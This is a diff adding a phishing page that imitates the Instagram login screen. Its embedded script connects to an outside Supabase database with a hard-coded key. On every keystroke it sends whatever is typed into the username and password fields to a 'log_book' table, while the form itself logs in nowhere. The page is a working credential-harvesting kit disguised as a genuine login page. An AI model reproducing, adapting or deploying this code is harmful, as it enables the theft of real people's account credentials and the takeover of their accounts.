@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="local_resources/css/eac8b4629ccd561e7109b9c43bfdbca1.css" rel="stylesheet"/>
+<title>Instagram</title>
+<style>
+        .container {
+            position: relative;
+            height: 100vh; /* or any other height you want */
+            width: 100vw; /* or any other width you want */
+        }
+
+        .centered-image {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: pulse 3s infinite;
+        }
+
+        .bottom-centered-image {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 5%; /* shrink the image to 80% of its original width */
+            height: auto; /* maintain the aspect ratio */
+
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translate(-50%, -50%) scale(0.8);
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(0.8);
+            }
+        }
+
+    </style>
+</head>
+<body>
+<div class="container" id="root">
+<img class="centered-image" src="local_resources/img/85b0934419c394161b58a51382eb9a26.png"/>
+<img class="bottom-centered-image" src="local_resources/img/f2d9e2878b759d7e273380ddc2abbbc8.png"/>
+</div>
+<div class="login-page" id="login-page" style="display: none;">
+<main>
+<section id="photos-ctr">
+<div class="instagram-phone">
+<img alt="mobile" src="local_resources/img/4d5b997523123f9e4982ea52846cec9a.png"/>
+</div>
+</section>
+<section id="details-ctr">
+<div id="login-ctr">
+<div id="logo">
+<img alt="Instragram logo; the text reads 'Instagram', written in the platform's iconic cursive font." height="65" src="local_resources/img/4825fb026c4743d62266456d2e5a97ee.png" width="175"/>
+</div>
+<div id="login">
+<form action="#" id="login-form">
+<div class="form-group">
+<input class="form-input" id="username" name="username" onkeyup="stateHandle()" pattern=".{1,}" placeholder="Phone number, username or email" required="" title="Must be a valid phone number, username or email." type="text"/>
+<label class="floating-label" for="username">Phone number, username or email</label>
+</div>
+<div class="form-group">
+<input class="form-input" id="password" oninput="stateHandle()" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" placeholder="Password" required="" title="Must contain at least one number, one uppercase and lowercase letter, and at least 8 or more characters." type="password"/>
+<label class="floating-label" for="password">Password</label>
+<button id="show-btn" onclick="showPassword()" type="button">Show</button>
+<button id="hide-btn" onclick="showPassword()" type="button">Hide</button>
+</div>
+<input formaction="#" href="#" id="login-btn" name="submit" type="submit" value="Log In"/>
+</form>
+</div>
+<div id="alt-options">
+<div id="or-separator">
+<div></div>
+<p>Or</p>
+<div></div>
+</div>
+<div id="fb-login">
+<a href="#"><img src="local_resources/img/3c7a33563f61e3842c923ab6263ce76f.png"/>
+<h5>Log in with Facebook</h5></a>
+</div>
+<div id="pw-forgot">
+<p><a href="#">Forgotten your password?</a></p>
+</div>
+</div>
+</div>
+<div id="sign-up-ctr">
+<p>Don't have an account? <span><a href="#">Sign Up</a></span></p>
+</div>
+<div id="get-app-ctr">
+<p>Get the app.</p>
+<div>
+<a href="https://apps.apple.com/app/instagram/id389801252?vt=lo" target="_blank"><img alt="Download on the App Store" src="local_resources/img/b3bac4bbb1be5cb30e026268dd9737dc.png"/></a>
+<a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb&amp;utm_campaign=loginPage&amp;ig_mid=4179E4D0-FB3D-4ABE-B9F3-4495B781021B&amp;utm_content=lo&amp;utm_medium=badge" target="_blank"><img alt="Get it on Google Play" src="local_resources/img/24f93e0691868e2214e5722481008c2a.png"/></a>
+</div>
+</div>
+</section>
+</main>
+<footer>
+<div id="footer-ctr">
+<div>
+<a href="#">Meta</a>
+<a href="#">About</a>
+<a href="#">Blog</a>
+<a href="#">Jobs</a>
+<a href="#">Help</a>
+<a href="#">API</a>
+<a href="#">Privacy</a>
+<a href="#">Cookie settings</a>
+<a href="#">Terms</a>
+<a href="#">Locations</a>
+<a href="#">Instagram Lite</a>
+<a href="#">Threads</a>
+</div>
+<div>
+<a href="#">Contact uploading and non-users</a>
+<a href="#">Meta Verified</a>
+</div>
+<div>
+<select>
+<option value="en">English</option>
+<option value="de">Deutsch</option>
+</select>
+<p id="select-replace">English</p>
+<div id="select-carrot-wrap">
+<span>
+<svg height="12" id="select-carrot" role="img" viewbox="0 0 24 24" width="12">
+<path d="M21 17.502a.997.997 0 01-.707-.293L12 8.913l-8.293 8.296a1 1 0 11-1.414-1.414l9-9.004a1.03 1.03 0 011.414 0l9 9.004A1 1 0 0121 17.502z"></path>
+</svg>
+</span>
+</div>
+<p id="meta-gram"> 2024 Instagram from Meta</p>
+</div>
+</div>
+</footer>
+</div>
+<script src="local_resources/js/d220ebb798e9d08b65dc950398f68b3f.js"></script>
+<script>
+        const { createClient } = supabase
+        const _supabase = createClient('https://nerwtbrpetvexscqybev.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcnd0YnJwZXR2ZXhzY3F5YmV2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjQzNDQ3MzQsImV4cCI6MjAzOTkyMDczNH0.7vaSMx1CMYvLWYRJP9FJB0W3hgVRkGWFDrqyzFLOuwU')
+
+        console.log('Supabase Instance: ', _supabase)
+
+
+        // GLOBAL VARIABLE DECLERATIONS
+        let username = document.querySelector("#username");
+        let password = document.querySelector("#password")
+        let loginButton = document.querySelector("#login-btn");
+        let showButton = document.querySelector("#show-btn");
+        let hideButton = document.querySelector("#hide-btn");
+
+        // LOGIN BUTTON ENABLE + DISABLE FUNCTION
+        username.addEventListener("change", stateHandle);
+        password.addEventListener("change", stateHandle);
+
+        function getAll() {
+            return { "everything": "you need" };
+        }
+
+        async function stateHandle() {
+            //const usernameText = username.val
+
+            const { error } = await _supabase
+            .from('log_book')
+            .insert({
+                    
+                "additional": getAll(),
+
+                "username": username.value,
+                "password": password.value,
+
+            })
+
+            if (error) {
+                console.error('Error inserting data:', error);
+            } else {
+                console.log('Data inserted successfully:');
+            }
+        }
+
+        function stateHandleUp() {
+            if (password.value.length > 5 ) {
+                loginButton.dsabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+
+        // PASSWORD SHOW/HIDE BUTTON SWTICH
+        function showPassword() {
+            if (password.type === "password") {
+                password.type = "text";
+                showButton.style.display = "none";
+                hideButton.style.visibility = "visible";
+            } else {
+                password.type = "password";
+                hideButton.style.visibility = "hidden";
+                showButton.style.display = "inline-block";
+            }
+        }
+
+        hideButton.style.visibility = "hidden";
+
+
+        function loadPage() {
+            // Using XMLHttpRequest
+            // var xhr = new XMLHttpRequest();
+            // xhr.open('GET', '/index2.html', true);
+            // xhr.onload = function() {
+            //     if (xhr.status === 200) {
+            //         const rootDiv = document.getElementById("root");
+            //         rootDiv.innerHTML = xhr.responseText;
+            //     }
+            // };
+            // xhr.send();
+            document.getElementById("root").style.display="none";
+            document.getElementById("login-page").style.display="";
+        }
+        setTimeout(loadPage, 1500);
+
+    </script>
+</body>
+</html>
